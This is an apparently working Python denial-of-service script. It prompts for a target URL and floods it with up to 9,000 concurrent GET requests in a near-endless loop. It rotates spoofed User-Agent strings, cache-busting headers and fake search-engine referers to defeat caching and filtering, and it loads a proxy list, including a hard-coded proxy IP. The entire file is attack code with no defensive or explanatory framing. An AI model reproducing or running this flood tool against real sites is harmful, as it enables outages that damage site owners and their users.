import os
import tasksio
from tasksio import TaskPool
import asyncio
import aiohttp 
os.system("clear")
#url= input("Target URL : ")
#th = int(input("Number Of Threads : "))
url = input("\033[91m Target URL :\033[0m")
th = 700
proxies=["37.110.112.84:8081"]
def ok():
  for line in open("proxies.txt"):
    proxies.append(line.replace("\n", ""))
  #print(proxies)
ua = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",
]
if th == None:
    th=64
import random
import requests
import httpx

from aiohttp_proxy import ProxyConnector, ProxyType
from itertools import cycle

bots=[]
bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
ca = ['no-cache','no-store','max-age='+str(random.randint(0,10)),'max-stale='+str(random.randint(0,100)),'min-fresh='+str(random.randint(0,10)),'notransform','only-if-cache']
a = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
acceptC = ['ISO-8859-1','utf-8','Windows-1251','ISO-8859-2','ISO-8859-15']
#bot = add_bots()
		
#n= [x for x in range(1,99999999)] 
import time
async def ddos(url, i):
  #print(url)
 try:
  ca = ['no-cache','no-store','max-age='+str(random.randint(0,10)),'max-stale='+str(random.randint(0,100)),'min-fresh='+str(random.randint(0,10)),'notransform','only-if-cache']
  a = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
  c=random.choice(ca)
  ac=random.choice(a)
  #time.sleep(1)
  headers = {'User-Agent': random.choice(ua), 'Cache-Control' : c,'Accept-Encoding' : ac,'Keep-Alive' : '42','Referer' : random.choice(bots)
            } 
  #prox = random.choice(proxies)
  #proxy = next(iter(proxies) )
  #proxy=random.choice(proxies)
  #connector = ProxyConnector(proxy_type=ProxyType.HTTP,host=proxy.split(":")[0],port=int(proxy.split(":")[1]),rdns=True) 
  st = time.time()
  
  #print(proxy)
  async with aiohttp.ClientSession() as client:
    #print(proxy)
    r = await client.get(url, headers=headers) 
    #print(proxy)
    msg = await r.text()
    #m= next(inter(n))
    et = time.time()
    t = et-st
    print(f"\033[91m Request {i} \033[0m\033[96m Status {r.status}\033[0m \033[94m Time {(t)//1} secs\033[0m")
      
    
    #r=httpx.get(f"https://stargate.cam")
    #print(r.text())
    #requests.get(url)
  
    
  
  
  #c=c+1
  #print(f"Request {c} ")
 except Exception as e:
   print(f"\033[93m Request {i} Failed\033[0m \033[91m {e}\033[0m") 
async def stress(url, th):
  print(" Initializing.....")
  async with TaskPool(9_000) as pool:
    for i in range(9999999999999):
      await pool.put(ddos(url,i))
      #await pool.put(ddos(url))
ok()
import time
#time.sleep(5)
#asyncio.run(ddos(url))
asyncio.run(stress(url, th)) 

























